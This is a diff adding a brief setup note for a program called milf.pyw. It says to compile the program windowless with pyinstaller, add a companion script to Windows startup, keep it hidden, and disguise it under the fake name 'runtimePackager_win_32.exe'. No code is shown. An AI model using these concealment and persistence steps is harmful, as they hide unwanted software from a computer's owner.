@@ -1,0 +1,9 @@
+milf.pyw is the source code, compiled into milf.exe using:
+pyinstaller --onefile -w milf.pyw
+
+ONLY add milfStartupAnalysis.pyw to startup. find a way to make sure it is hidden, even if it needs to be compiled first.
+idea: "runtimePackager_win_32.exe" as a fake name
+
+add the file path you would like the cloned milf.exe to go to, e.g: Desktop/MILF, to the "milfPATH.txt" file.
+
+Do not add this to the computer, this is not vital for the program.
